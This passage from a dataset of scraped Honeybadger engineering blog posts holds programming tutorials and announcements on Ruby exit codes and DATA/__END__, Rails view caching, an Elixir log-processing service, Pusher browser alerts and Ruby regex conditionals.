exit code. That's what makes it possible for bash code like this to work: $ prog1 && prog2 If you're not familiar with bash's && operator, it simply means \"run prog2 only if prog1 exited successfully.\" Ruby exits with a \"success\" code by default, and a \"failure\" code on exception. Everything else is up to you to implement. Fortunately, it's easy: # Any nonzero argument to `exit` counts as failure exit ( 1 ) For more info, check out my other post How to exit a Ruby program . Setting the process name If your command-line program is going to be running for a little while, it's important that people know what it is when they list the systems processes. Normally, a Ruby programs process name consists of everything that you typed in to run the program. So if you typed in ruby myapp -v , that's the name of the process. If your program has a lot of arguments, this can become unreadable. So you might want to set a more friendly process name. You can do this like so: Process . setproctitle ( \"My Awesome Command Line App\" ) If you're feeling fancy, you can use the process title to give the user information about what the processes doing at any given moment. Process . setproctitle ( \"Mail Sender: initializing\" ) init ( ... ) Process . setproctitle ( \"Mail Sender: connecting\" ) connect ( ... ) Process . setproctitle ( \"Mail Sender: sending\" ) send ( ... ) For more info, check out my post: How to change the process name of your Ruby script as shown by top and ps", "date": "2016-01-05"},
{"website": "Honey-Badger", "title": "Batch Resolve and Error Trendlines", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/batch-resolve-and-error-trendlines/", "abstract": "Batch Resolve Don't think we settled for a dumb old \"resolve all\" button. Our batch resolve is tied to our powerful error search system. That means you can resolve all errors assigned to you that are in staging and contain the word \"banana.\" Trendlines Your projects list now has sparklines for notices created within the past hour. You'll be seeing more graphs like this pop up over the next few months.", "date": "2013-05-13"},
{"website": "Honey-Badger", "title": "Mixing code and data in Ruby with DATA and __END__", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/data-and-end-in-ruby/", "abstract": "Did you know that Ruby provides a way for your script to use its own source file as a source of data? It's a neat trick that can save you some time when writing one-off scripts and proofs of concept.  Let's check it out! DATA and END In the example below, I'm using a funny keyword called __END__ . Everything below __END__ will be ignored by the Ruby interpreter. But more interestingly, ruby provides you with an IO object called DATA , which lets you read everything below __END__ just like you can read from any other file. In the following example, we iterate over each line and print it. DATA . each_line do | line | puts line end __END__\nDoom\nQuake\nDiablo My favorite practical example of this technique uses DATA to contain an ERB template. It also works with YAML, CSV and so on. M require 'erb' time = Time . now renderer = ERB . new ( DATA . read ) puts renderer . result () __END__\nThe current time is <%= time %>. You can actually use DATA to read content above the __END__ keyword. That's because DATA is actually a pointer to the entire source file, fast-forwarded to the __END__ keyword. You can see this if you rewind the IO object before printing it. The example below prints out the entire source file. DATA . rewind puts DATA . read # prints the entire source file __END__\nmeh The multiple-file delimma One of the big downsides to this technique is that it only really works if your script fits into a single source file, and you're running that file directly, rather than including it. In the example below, I've got two files, each with their own __END__ section. However there can be only one DATA global. So the __END__ section of the second file is inaccessible. # first.rb require \"./second\" puts \"First file \\n ----------------------\" puts DATA . read print_second_data () __END__\nFirst end clause # second.rb def print_second_data puts \"Second file \\n ----------------------\" puts DATA . read # Won't output anything, since first.rb read the entire file end __END__\n\nSecond end clause snhorne ~ /tmp $ ruby first.rb\nFirst file\n----------------------\nFirst end clause\n\nSecond file\n---------------------- A work-around for multiple files Sinatra has a pretty cool feature that allows you to add multiple inline templates to your apps by putting them after an __END__ statement. It looks like this: # This code is from the Sinatra docs at http://www.sinatrarb.com/intro.html require 'sinatra' get '/' do haml :index end __END__\n\n@@ layout\n%html\n  = yield\n\n@@ index\n%div.title Hello world. But how exactly can sinatra do this? After all, your app is probably going to be loaded by rack. You're not going to run ruby myapp.rb in production! They must have figured out a way to use DATA with multiple files. Though, if you dig into the Sinatra source a little, you'll see that they're kind of cheating. They're not using DATA at all. Instead they're doing something similar to the code below. # I'm paraphrasing. See the original at https://github.com/sinatra/sinatra/blob/master/lib/sinatra/base.rb#L1284 app , data = File . read ( __FILE__ ). split ( /^__END__$/ , 2 ) It's actually a little more complicated, because they don't want to read __FILE__ . That would just be the sinatra/base.rb file. Instead they want to get the content of the file which invoked a function. They get this by parsing the result of caller. The caller function will tell you where the currently running function was invoked. Here's a quick example: def some_method puts caller end some_method # => caller.rb:5:in `<main>' Now it's a pretty simple matter to pull the filename out of there, and extract something equivalent to DATA for that file. def get_caller_data puts File . read ( caller . first . split ( \":\" ). first ). split ( \"__END__\" , 2 ). last end Use it for good, not evil Hopefully it's obvious that tricks like these aren't something that you'll want to use every day. They don't exactly make for clean, maintainable large code bases. However occasionally you need something quick and dirty, either for a one-off utility script or for a proof of concept. In that case, DATA and __END__ can be pretty useful.", "date": "2015-08-19"},
{"website": "Honey-Badger", "title": "Everything You Ever Wanted To Know About View Caching In Rails", "author": ["Jonathan Miles"], "link": "https://www.honeybadger.io/blog/ruby-rails-view-caching/", "abstract": "Caching is a general term that means storing the result of some code so that we can quickly retrieve it later. This allows us to, for example, avoid hitting the database over and over to get data that rarely changes. Although the general concept is the same for all types of caching, Rails provides us with different aids depending on what we are trying to cache. For Rails developers, common forms of caching include memoization, low-level caching (both covered in previous parts of this caching series), and view caching, which we will cover here. How Ruby on Rails Renders Views First, let's cover some slightly confusing terminology. What the Rails community calls \"views\" are the files that live inside your app/views directory. Typically, these are .html.erb files, although there are other options (i.e., plain .html , .js.erb , or files that use other preprocessors, such as slim and haml). In many other web frameworks, these files are called \"templates\", which I think better describes their use. When a Rails application receives a GET request, it is routed to a particular controller action, for example, UsersController#index . The action is then responsible for gathering any needed information from the database and passing it on for use in rendering a view/template file. At this point, we are entering the \"view layer\". Typically, your view (or template) will be a mixture of hard-coded HTML markup and dynamic Ruby code: #app/views/users/index.html.erb <div class= 'user-list' > <% @users . each do | user | %> <div class= 'user-name' > <%= user . name %> </div> <% end %> </div> Ruby code in the file needs to be executed to render the view (for erb that's anything in <% %> tags). Refresh the page 100 times, and @users.each... will be executed 100 times. The same is true for any partials included; the processor needs to load the partial html.erb file, execute all the Ruby code inside it, and combine the results into a single HTML file to send back to the requester. What Causes Slow Views You've probably noticed that when you view a page during development, Rails prints out a lot of log information, which looks something like the following: Processing by PagesController#home as HTML\n  Rendering layouts/application.html.erb\n  Rendering pages/home.html.erb within layouts/application\n  Rendered pages/home.html.erb within layouts/application (Duration: 4.0ms | Allocations: 1169)\n  Rendered layouts/application.html.erb (Duration: 35.9ms | Allocations: 8587)\nCompleted 200 OK in 68ms (Views: 40.0ms | ActiveRecord: 15.7ms | Allocations: 14307) The last line is the most useful to us at this stage. By following the times from left to right, we see that the total time taken by Rails to return a response to the browser was 68ms, of which 40ms was spent rendering erb files and 15.7ms on processing ActiveRecord queries. Although it is a trivial example, it also shows why we may want to look at caching the view layer. Even if we could magically make ActiveRecord queries happen instantly, we're spending more than twice as long to render the erb . There are a few reasons our view rendering might be slow; for example, we might be calling expensive DB queries within the views or performing a lot of work within loops. One of the most common situations I've seen is simply rendering a lot of partials, perhaps with multiple levels of nesting. Imagine an email inbox, where we might have a partial that handles an individual row: # app/views/emails/_email.html.erb <li class= \"email-line\" > <div class= \"email-sender\" > <%= email . from_address %> </div> <div class= \"email-subject\" > <%= email . subject %> </div> </div> And, in our main inbox page, we render the partial for each email: # app/views/emails/index.html.erb\n\n... <% @emails . each do | email | %> <%= render email %> <% end %> If our inbox has 100 messages, then we are rendering the _email.html.erb partials 100 times. With our trivial example, this is not much of a concern. On my machine, the partial only takes 15ms to render the whole index. Of course, real-world examples would be more complicated and may even include other partials within them; it's not difficult for the render time to increase. Even if it only takes 1-2ms to render our _email partial, it would take 100-200ms to do the whole collection. Fortunately, Rails has some built-in functionality to help us easily add caching to solve this problem, whether we want to cache just the __email partial, the index page, or both. What is View Caching View caching in Ruby on Rails is taking the HTML that a view generates and storing it for later. Although Rails has support for writing these to the filesystem or keeping them in memory, for production use, you'll almost certainly want a standalone caching server, such as Memcached or Redis. Rails' memory_store is useful for development but can't be shared across processes (e.g., multiple servers/dynos or forking servers, such as unicorn). Similarly, the file_store is local to the server. Therefore, it can't be shared across multiple boxes, and it won't delete expired entries automatically, so you'll need to periodically call Rails.cache.clear to prevent your server's disk from getting full. Enabling a caching store can be done in your environment configuration file (e.g., config/environments/production.rb ): # memory store is handy for testing # during development but not advisable # for production config . cache_store = :memory_store In a default installation, your development.rb will already have some configuration done for you to allow easy toggling of caching on your machine. Simply run rails dev:cache to toggle caching on and off. Caching a view in Rails is deceptively simple, so to illustrate the performance difference, I'll just use sleep(5) to create an artificial delay: <% cache do %> <div> <p> Hi <%= @user . name %> <% sleep ( 5 ) %> </div> <% end %> Rendering this view the first time takes 5 seconds, as expected. However, loading it up a second time only takes a few milliseconds because everything inside the cache do block is fetched from the cache. Adding View Caching By Example Let's take a small example view and walk through our options for caching. We'll assume that this view is actually causing some performance issues: # app/views/user/show.html.erb <div> Hi <%= @user . name %> ! <div> <div> Here's your list of posts,\n  you've written <%= @user . posts . count %> so far <% @user . posts . each do | post | < div >< %= post.body %> </div> <% end %> </div> <% sleep(5) #artificial delay %> This gives us a basic skeleton to work with, along with our artificial 5-second delay. First, we can wrap the whole show.html.erb file in a cache do block, as described earlier. Now, once the cache is warm, we get nice, fast rendering times. It doesn't take long to start seeing issues with this plan, though. First, what happens if users change their name? We haven't told Rails when to expire our cached page, so the user may never see an updated version. An easy solution is to just pass the @user object to the cache method: <% cache ( @user ) do %> <div> Hi <%= @user . name %> ! </div> ... <% sleep ( 5 ) #artificial delay %> <% end %> The previous article in this series on low-level caching covered the details of cache keys, so I won't cover it again here. For now, it's enough to know that if we pass a model to cache() , it will use that model's updated_at attribute to generate a key to look up in the cache. In other words, whenever @user is updated, this cached page will expire, and Rails will re-render the HTML. We've taken care of the case when users change their name, but what about their posts? Changing an existing post or creating a new one won't change the updated_at timestamp of the User , so our cached page won't expire. Additionally, if users change their name, we will re-render all of their posts, even if their posts have not changed. To solve both these problems; we can use \"Russian doll caching\" (i.e., caches within caches): <% cache ( @user ) do %> <div> Hi <%= @user . name %> ! <div> <div> Here's your list of posts,\n    you've written <%= @user . posts . count %> so far <br> <% @user . posts . each do | post | %> <% cache ( post ) do %> <div> <%= post . body %> </div> <% end %> <% end %> </div> <% sleep ( 5 ) #artificial delay %> <% end %> We are now caching each individually rendered post (in the real world, this would probably be a partial). Therefore, even if @user is updated, we don't have to re-render the post; we can just use the cached value. We still have one more issue, though. If a post is changed, we still won't render the update because @user.update_at has not changed, so the block inside cache(@user) do will not execute. To fix this issue, we need to add touch: true to our Post model: class Post < ApplicationRecord belongs_to :user , touch: true end By adding touch: true here, we are telling ActiveRecord that every time a post is updated, we want the updated_at timestamp of the user it \"belongs to\" to also be updated. I should also add that Rails provides a specific helper for rendering a collection of partials, given how common it is: <%= render partial: 'posts/post' , collection: @posts , cached: true %> Which is functionally equivalent to the following: <% @posts . each do | post | %> <% cache ( post ) do %> <%= render post %> <% end %> <% end %> Not only is the render partial: ... cached: true form less verbose, it also gives you some extra efficiency because Rails can issue a multiget to the cache store (i.e., reading many key/value pairs in a single round-trip) rather than hitting your cache store for each item in the collection. Dynamic Page Content It's common for some pages to include some amount of 'dynamic' content that changes at a much faster rate than the rest of the page around it. This is particularly true on home pages or dashboards, where you might have activity/news feeds. Including these in our cached page could mean our cache needs to be invalidated frequently, which limits the benefit we get from caching in the first place. As a simple example, let's add the current day to our view: <% cache ( @user ) do %> <div> Hi <%= @user . name %> ,\n    hope you're having a great <%= Date . today . strftime ( \"%A\" ) %> ! <div> ... <% end %> We could invalidate the cache every day, but that's not very practical for obvious reasons. One option is to use a placeholder value (or even just an empty <span> ) and populate it with javascript. This kind of approach is often called \"javascript sprinkles\" and is an approach largely favored by Basecamp, where a lot of Rails' core code is developed. The result would be something like this: <% cache ( @user ) do %> <div> Hi <%= @user . name %> ,\n    hope you're having a great <span id= 'greeting-day-name' > Day </span> ! <div> ... <% end %> <script> // assuming you're using vanilla JS with turbolinks document . addEventListener ( \" turbolinks:load \" , function () { weekdays = new Array ( ' Sunday ' , ' Monday ' , ' Tuesday ' , ' Wednesday ' , ' Thursday ' , ' Friday ' , ' Saturday ' ); today = weekdays [ new Date (). getDay ()]; document . getElementById ( \" greeting-day-name \" ). textContent = today ; }); </script> Another approach is to cache only some parts of the view. In our example, the greeting is at the top of the page, so it's fairly trivial to only cache what follows: <div> Hi <%= @user . name %> ,\n  hope you're having a great <%= Date . today . strftime ( \"%A\" ) %> ! <div> <% cache ( @user ) do %> ... <% end %> Obviously, this is often not as simple with layouts you find in the real world, so you will have to be considerate about where and how you apply caching. Words of Warning It is easy to look at view caching as a quick-and-easy panacea for performance problems. Indeed, Rails makes it incredibly easy to cache views and partials, even when they are deeply nested. In the first article in this series, I laid out the issues that can arise when you add caching into your system, but I think this is particularly true with view-level caching. The reason is that views, by their very nature, tend to have more interactions with the underlying data of a system. When you apply memoization or low-level caching in Rails, you often don't need to look outside the file you're in to determine when and why the cached value should be refreshed. A view, on the other hand, could have multiple different models being called, and without deliberate planning, it can be difficult to see which models should cause which part of the view to be re-rendered at which time. As with low-level caching, the best advice is to be strategic about where and when you use it. Use as little caching as you can, in as few places as you can, to achieve an acceptable level of performance. Rails' Caching by Default So far in this series on caching we've covered ways of caching things manually but even without any manual configuration, ActiveRecord already does some caching under-the-hood to speed up queries (or skip them entirely). In the next article in this series on caching we'll look at what ActiveRecord is caching for us, and how, with a small amount of work, we can have it keep a \"counter cache\" so lines like thing.children.size don't have to hit the database at all to get an up to date count.", "date": "2020-10-13"},
{"website": "Honey-Badger", "title": "How Honeybadger uses Elixir to monitor Heroku", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/logplex-elixir/", "abstract": "Last year, I attended my first ElixirConf in Austin, TX. We were first-time sponsors of the conference and had just launched Honeybadger for Elixir, the first of its kind error tracking package for Elixir . My friend and Elixir-aficionado, Richard Bishop , wrote the code. On the flight to Austin and over the course of the conference (in between talks and hanging out with awesome new friends) I read Introducing Elixir: Getting Started in Functional Programming by Simon St. Laurent. On the flight home (even though I was pretty exhausted) I started writing my first Elixir web service which would come to serve as an important part of our stack at Honeybadger. This is the story of that project . The problem Honeybadger provides an addon for Heroku which tracks application errors in Heroku apps . When an error happens (say, in your Rails or Phoenix app), Honeybadger catches it and reports it to our servers for analysis and alerting before allowing the application to continue to handle the error however it prefers. Unfortunately, application errors are only half the story. What happens when something goes wrong outside of your application code? You might use something like our Uptime Monitoring to be alerted of catastrophic outages such as when EC2 is down, DNS fails, etc., but that doesn't cover transient issues which are outside of the application stack but may not result in a complete outage. On Heroku there is an entire class of errors which can happen before your application code even runs (or sometimes when it times out or crashes fatally). The problem was that nobody was monitoring these errors (including us), and we wanted to fix that . The plan Heroku doesn't expose its platform errors anywhere, but it does log them. That means that if your app is timing out you can run heroku logs --tail to see what's going on. The logs look something like this: 288 <158>1 2015-08-04T23:49:21.287927+00:00 host heroku router - at=error code=H12 desc=\"Request timeout\" method=GET path=\"/pages/timeout\" host=crywolf.herokuapp.com request_id=ea2e64e5-1de5-4d93-b46c-5760f47814ae fwd=\"76.105.197.61\" dyno=web.1 connect=2ms service=30000ms status=503 bytes=0 You can see the code=H12 tag which corresponds to the request timeout error code . So there's no way to get the platform errors out of the application like we do with application errors, but there is a way to get the logs. Heroku's Logplex service exists for just that purpose. It allows you to set up a \"log drain\" which will then POST an application's logs to the HTTPS endpoint that you specify. Additionally, Heroku addons can be configured to automatically create a log drain when the addon is installed . This is how log-monitoring addons work on Heroku. So here's what we decided to do: monitor our customer's logs via Heroku's Logplex service, scan for Heroku platform errors, and then report them to our standard collector API , which is how we also collect application errors. Simple enough, right? There was just one minor hurdle: a typical web app generates a lot of logs, and we're monitoring thousands of apps. If we're going to process every log for every Heroku application which uses Honeybadger, then we're going to need be fast . Like, tens of thousands of requests per second fast. Enter Elixir From elixir-lang.org : Elixir is a dynamic, functional language designed for building scalable and maintainable applications. Elixir leverages the Erlang VM, known for running low-latency, distributed and fault-tolerant systems, while also being successfully used in web development and the embedded software domain. We had been hearing that Elixir was great for low-latency, high-trafic web applications and services for a while, and wanted to see for ourselves what all the fuss was about. This seemed like the perfect opportunity to get it running in production. What emerged was a relatively simple (thanks in part to the clean, functional style of programming) web service with a single HTTP endpoint. Because we wanted to keep the code as lean as possible, I chose to build the app directly on Plug rather than Phoenix , the popular web framework for Elixir (Phoenix actually uses Plug for its middleware stack, similar to how Ruby on Rails uses Rack). Plug Plug allows you to develop composable modules for handling various parts of web applications which can be served directly by Cowboy, an HTTP server written in Erlang . Here's the canonical \"Hello World\" Plug application: defmodule MyPlug do import Plug . Conn def init ( options ) do # initialize options options end def call ( conn , _opts ) do conn |> put_resp_content_type ( \"text/plain\" ) |> send_resp ( 200 , \"Hello world\" ) end end You can also create a router which wires up the various plugs that sit between an endpoint and the server: defmodule AppRouter do use Plug . Router plug :match plug :dispatch get \"/hello\" do send_resp ( conn , 200 , \"world\" ) end match _ do send_resp ( conn , 404 , \"oops\" ) end end Our solution Our Plug application is just a handful of modules: Client handles reporting logs to Honeybadger. Parser provides functions to parse logs from Heroku Logplex. Logger is a plug which logs information about each request internally. Router wires everything up, parsing inbound requests with the Parser and reporting Heroku platform errors to the Client , which reports them to our API. To show how simple this really can be in Elixir, here's our full Plug router, in all its glory: defmodule Logplex . Router do @moduledoc \"\"\"\n  Handles incoming requests via plug router.\n  \"\"\" use Plug . Router use Honeybadger . Plug alias Logplex . Client alias Logplex . Parser plug Plug . Statsd plug Logplex . Logger plug :match plug :dispatch post \"/heroku/v1\" do { :ok , body , _ } = Plug . Conn . read_body ( conn ) %{ query_params: params } = Plug . Conn . fetch_query_params ( conn ) process ( body , params ) send_resp ( conn , 200 , []) end match _ do send_resp ( conn , 404 , \"wut?\" ) end defp process ( body , params ) do Task . start fn -> errors = Parser . parse ( body ) Client . report ( errors , params ) end end end There are a few interesting things to note about the router which we'll look at briefly in turn: We're monitoring our own errors with Honeybadger You can see that we're using the plug from our error tracking package for Elixir (which I mentioned earlier), which provides its own plug that monitors all internal exceptions: use Honeybadger . Plug We're doing the work in separate processes Elixir does concurrency via processes . Each request is handled inside its own process (by Cowboy/Plug), and we're creating an additional process (via the Task module ) to scan the logs from each request (Heroku Logplex batches each application's logs, so there may be multiple lines in each payload): defp process ( body , params ) do Task . start fn -> errors = Parser . parse ( body ) Client . report ( errors , params ) end end Each request to our API (which is what happens when Parser.parse/1 finds one or more platform errors) is also handled in a separate process (which happens inside the Client module: defp post ( log , params ) do Task . start fn -> StatsD . timing \"notices.duration\" , fn -> _post ( log , params ) end end end This helps us distribute all the different jobs across each node, which is one of the coolest parts of Erlang. We're monitoring Elixir with StatsD It's important for us to have detailed metrics about how our app is performing, and so we're using the ex_statsd package to collect the following metrics: The number of total requests from Heroku Logplex The duration of each request The number of platform errors scanned The number of platform errors reported The number of failures when reporting platform errors, by status code ...and we're monitoring Elixir with Honeybadger We also recently released a new version of Honeybadger for Elixir which automatically sends request metrics to Honeybadger, which has been our number one feature request for Elixir monitoring. If you've been wanting this, it's now available as of version 0.5.0 ! Deployment We deployed the app to AWS EC2 . We set up an autoscale group with two c4.large instances; we could probably get away with a single instance, but we figured it couldn't hurt to have some initial redundancy. When the CPU on either instance reaches 70%, an extra instance is launched; when the CPU drops below 70%, the extra instance(s) are terminated. We're using exrm to build releases (another cool feature of Elixir) when we deploy, which has probably been the most difficult part of all of this (more on that later). Results Elixir's speed was immediately tangible, thanks to our metrics instrumentation. The first thing that jumped out at me was that our charts were measuring in microseconds, which is 1 millionth of a second (or 1 thousandth of a millisecond): We regularly burst up to 100k requests per minute (rpm) and traffic is still increasing; our current traffic levels are for a subset of apps using our addon, so usage is growing as more apps sign up and older apps opt-in to Logplex monitoring. Performance could improve We've been finding that CPU usage tends to exceed 70% when we do burst past 100k rpm, causing new instances to be launched. We expected to be able to handle much more than ~1-2k requests per second (rps) on a single node. So, there's room for improvement there; it's possible that we have some tuning to do. Deploying is hard Probably the hardest part of Elixir has been deploying it. We wanted to take advantage of hot upgrades/downgrades , but we routinely have issues deploying new releases. Some of this may be due to our inexperience with \"the Erlang way\", and we'll always have more learning to do. In the meantime we're considering changing our deployment strategy to run releases directly from rel/ and always do a cold restart of the app when deploying. Since we're running on AWS we can still get the benefits of zero-downtime deploys by doing rolling restarts. That said, we'd really like to learn how to network Elixir nodes across AWS instances (in an autoscale group) and deploy those using hot upgrades/downgrades. ...but Elixir is awesome We've been running this Elixir service for about half a year now, and haven't really had to think about it except when we deploy new versions of the Honeybadger package for Elixir ; it automatically scales when it needs to, and Elixir itself is a joy to write. That's a huge win for us. At Honeybadger we're continually looking for new ways to go the extra mile to delight our customers, and we're excited that Elixir can play a part in that. If you aren't a customer yet and add our Heroku addon to your app then you will start seeing platform errors immediately. Existing customers (both of our addon and Honeybadger.io) will need to do some extra setup to start seeing platform errors. For full instructions, check out the end of this post . Also, a quick shoutout to ElixirConf 2016 , which is happening in Orlando this year. I really enjoyed my first ElixirConf last year, and highly recommend going if you're curious about Elixir and/or want to hang out with a great group of developers. Questions/suggestions? I'd love to hear them -- email me !", "date": "2016-05-11"},
{"website": "Honey-Badger", "title": "How we implemented in-browser alerts with Pusher, Rails and Pnotify", "author": ["Benjamin Curtis"], "link": "https://www.honeybadger.io/blog/in-browser-notifications/", "abstract": "Today we're announcing the launch of a fun feature: In-browser notifications. Once enabled on the Notifications tab of the Project Settings page, you'll get a popup notification in the corner of the browser window when one of the events occurs that you've selected to be alerted about (like an error occurring, or a comment being added). As an added bonus, you can also choose to have a popup window appear on your desktop. The combination of Pusher and pNotify made this easy to implement -- here's how I did it. First, start off by creating a Pusher account. Ok, sure, you could use something like Faye to build this, but hey, Pusher is awesome, so why not? :) With a Pusher account in hand, let's take a look at the client-side implementation. After including the Pusher javascript and setting up a new Pusher instance with our Pusher key, I subscribe each user to his own presence channel , and then look for events on that channel: presenceChannel = pusher . subscribe ( \"presence-user- #{ user_id } \" ) presenceChannel . bind \"alert\" , ( data ) -> notice = new PNotify title : data . title text : data . text type : data . type || 'alert' icon : null desktop : desktop : true icon : \"https://www.honeybadger.io/images/icon.png\" tag : \" #{ data . title } : #{ data . url } \" if data . url notice . get (). click -> if notice . state is 'open' window . open ( data . url ) The desktop hash specified when creating the notice enables the desktop module support in pNotify, which uses the Notifications API to do the desktop notifications. If there's a URL associated with the alert, the notice is set up to load that URL when the popup is clicked, unless the click is a result of the popup being closed with the close button (in which case the notice.state is 'closing'). This click behavior works on both the in-browser popup and the desktop notification, opening the URL in a new tab. Now on to the server side... We have a whole lot of notifications flying around here at Honeybadger, and we really don't want to be sending payloads to Pusher if you don't have a browser window open to our site. So when an event happens, we first check to see if you are on the site before sending the notification to Pusher. Our notification engine knows if you're using the site thanks to Pusher's webhooks . Whenever you join or leave your personal presence channel, Pusher's webhook hits our endpoint to let us know, and we keep a tally of who's around in a redis set: Array ( params [ :events ]). each do | e | next unless e [ :name ] == 'member_added' || e [ :name ] == 'member_removed' Redis . current . send ( e [ :name ] == 'member_added' ? :sadd : :srem , \"active_users\" , e [ :user_id ]) end And finally, we use Pusher to send a message to you: Pusher . trigger ( \"presence-user- #{ user_id } \" , \"alert\" , text: event . message , url: event . url , title: event . title ) And with that, you can get a popup on your desktop as soon as an error happens in your Rails app, and that's pretty cool. :)", "date": "2014-05-28"},
{"website": "Honey-Badger", "title": "Using conditionals inside Ruby regular expressions", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/using-conditionals-inside-ruby-regular-expressions/", "abstract": "Of the many new features that Ruby 2.0 shipped back in 2013, the one I paid least attention to was the new regular expression engine, Onigmo . After all, regular expressions are regular expressions - why should I care how Ruby implements them? As it turns out, the Onigmo regex engine has a few neat tricks up its sleeve including the ability to use conditionals inside of your regular expressions. In this post we'll dive in to regex conditionals, learn about the quirks of Ruby's implementation of them, and discuss a few tricks to work around Ruby's limitations. Let's get started! Groups & Capturing To understand conditionals in regular expressions, you first need to understand grouping and capturing. Imagine that you have a list of US cites: Fayetteville, AR\nSeattle, WA You'd like to separate the city name from the state abbreviation. One way to do this is to perform multiple matches: PLACE = \"Fayetteville, AR\" # City: Match any char that's not a comma PLACE . match ( /[^,]+/ ) # => #<MatchData \"Fayetteville\"> # Separator: Match a comma and optional spaces PLACE . match ( /, */ ) # => #<MatchData \", \"> # State: Match a 2-letter code at the end of the string. PLACE . match ( /[A-Z]{2}$/ ) # => #<MatchData \"AR\"> This works, but it's too verbose. By using groups, you can capture both the city and state with only one regular expression. So let's combine the regular expressions above, and surround each section with parentheses. Parens are how you group things in regular expressions. PLACE = \"Fayetteville, AR\" m = PLACE . match ( /([^,]+)(, *)([A-Z]{2})/ ) # => #<MatchData \"Fayetteville, AR\" 1:\"Fayetteville\" 2:\", \" 3:\"AR\"> As you can see, the expression above captures both city and state. You access them by treating MatchData like an array: m [ 1 ] # => \"Fayetteville\" m [ 3 ] # => \"AR\" The problem with grouping, as it's done above, is that the captured data is put into an array. If its position in the array changes, you have to update your code or you've just introduced a bug. For example, we might decide that it's silly to capture the \", \" characters. So we remove the parens around that part of the regular expression: m = PLACE . match ( /([^,]+), *([A-Z]{2})/ ) # => #<MatchData \"Fayetteville, AR\" 1:\"Fayetteville\" 2:\"AR\"> m [ 3 ] # => nil But now m[3] no longer contains the state - bug city. Named groups You can make regular expression groups a lot more semantic by naming them. The syntax is pretty similar to what we just used. We surround the regex in parens, and specify the name like so: /(?<groupname>regex)/ If we apply this to our city/state regular expression, we get: m = PLACE . match ( /(?<city>[^,]+), *(?<state>[A-Z]{2})/ ) # => #<MatchData \"Fayetteville, AR\" city:\"Fayetteville\" state:\"AR\"> And we can access the captured data by treating MatchData like a hash: m [ :city ] # => \"Fayetteville\" Conditionals Conditionals in regular expressions take the form /(?(A)X|Y)/ . Here are a few valid ways to use them: # If A is true, then evaluate the expression X, else evaluate Y /(?(A)X|Y)/ # If A is true, then X /(?(A)X)/ # If A is false, then Y /(?(A)|Y)/ Two of the most common options for your condition, A are: Has a named or numbered group been captured? Does a look-around evaluate to true? Let's look at how to use them: Has a group been captured? To check for the presence of a group, use the ?(n) syntax, where n is an integer, or a group name surrounded by <> or '' . # Has group number 1 been captured? /(?(1)foo|bar)/ # Has a group named \"mygroup\" been captured? /(?(<mygroup>)foo|bar)/ Example Imagine you're parsing US telephone numbers. These numbers have a three-digit area code that is optional unless the number starts with one. 1-800-555-1212 # Valid\n800-555-1212 # Valid\n555-1212 # Valid\n\n1-555-1212 # INVALID!! We can use a conditional to make the area code a requirement only if the number starts with 1. # This regular expression looks complex, but it's made of simple pieces # `^(1-)?` Does the string start with \"1-\"? If so, capture it as group 1 # `(?(1)` Was anything captured in group one? # `\\d{3}-` if so, do a required match of three digits and a dash (the area code) # `|(\\d{3}-)?` if not, do an optional match of three digits and a dash (area code) # `\\d{3}-\\d{4}` match the rest of the phone number, which is always required. re = /^(1-)?(?(1)\\d{3}-|(\\d{3}-)?)\\d{3}-\\d{4}/ \"1-800-555-1212\" . match ( re ) #=> #<MatchData \"1-800-555-1212\" 1:\"1-\" 2:nil> \"800-555-1212\" . match ( re ) #=> #<MatchData \"800-555-1212\" 1:nil 2:\"800-\"> \"555-1212\" . match ( re ) #=> #<MatchData \"555-1212\" 1:nil 2:nil> \"1-555-1212\" . match ( re ) => nil Limitations One problem with using group-based conditionals is that matching a group \"consumes\" those characters in the string. Those characters can't be used by the conditional, then. For example, the following code tries and fails to match 100 if the text \"USD\" is present: \"100USD\" . match ( /(USD)(?(1)\\d+)/ ) # nil In Perl and some other languages, you can add a look-ahead statement to your conditional. This lets you trigger the conditional based on text anywhere in the string. But Ruby doesn't have this, so we have to get a little creative. Look-around Fortunately, we can work around the limitations in Ruby's regex conditionals by abusing look-around expressions. What is a look-around? Normally, the regular expression parser steps through your string from the beginning to the end looking for matches. It's like moving the cursor from left to right in a word processor. Look-ahead and look-behind expressions work a little differently. They let you inspect the string without consuming any characters. When they're done, the cursor is left in the exact same spot it was at the beginning. For a great introduction to look-arounds, check out Rexegg's guide to mastering look ahead and look behind The syntax looks like so: Type Syntax Example Look Ahead (?=query) \\d+(?= dollars) matches 100 in \"100 dollars\" Negative Look Ahead (?!query) \\d+(?! dollars) matches 100 if it is NOT followed by the word \"dollars\" Look Behind (?<=query) (?<=lucky )\\d matches 7 in \"lucky 7\" Negative Look Behind (?<!query) (?<!furious )\\d matches 7 in \"lucky 7\" Abusing look-arounds to enhance conditionals In our conditional, we can only query the existence of groups that have already been set. Normally, this means that content of the group has been consumed and isn't available to the conditional. But you can use a look-ahead to set a group without consuming any characters! Is your mind blown yet? Remember this code that didn't work? \"100USD\" . match ( /(USD)(?(1)\\d+)/ ) # nil If we modify it to capture the group in a look-ahead, it suddenly works fine: \"100USD\" . match ( /(?=.*(USD))(?(1)\\d+)/ ) => #<MatchData \"100\" 1:\"USD\"> Let's break down that query and see what's going on: (?=.*(USD)) Using a look-ahead, scan the text for \"USD\" and capture it in group 1 (?(1) If group 1 exists \\d+ Then match one or more numbers Pretty neat, huh?", "date": "2015-10-26"},
{"website": "Honey-Badger", "title": "Getting Started with AngularJS and Rails 4", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/beginners-guide-to-angular-js-rails/", "abstract": "Getting started with AngularJS isn't hard. The documentation is some of the best out there and it's tutorials are simple enough. But things get tricky when you start combining technologies. If you're using CoffeeScript instead of straight JavaScript, you know have preprocessing concerns to take into account - as well as the obvious syntax difference. These are minor issues by themselves, but what if you throw Ruby on Rails, Jasmine and Karma into the mix? It gets surprisingly trickier. This is exactly the stack we're going to use in this tutorial. Not because we're gluttons for punishment, but because this is the kind of setup you'll see in the real world. This tutorial assumes that you're comfortable with Rails, but not necessarily AngularJS. Creating a base Rails app Since there are so many technology layers involved, I'm going to build a simple application that barely does anything. We'll be setting up CRUD functionality for restaurants - actually, just the CR part. The -UD is left as an exercise for the reader. ;-) We'll call the application Restauranteur . I'm using PostgreSQL and RSpec here, but the DBMS and server-side testing framework are not significant. You can use whatever you want. Initial setup First create the 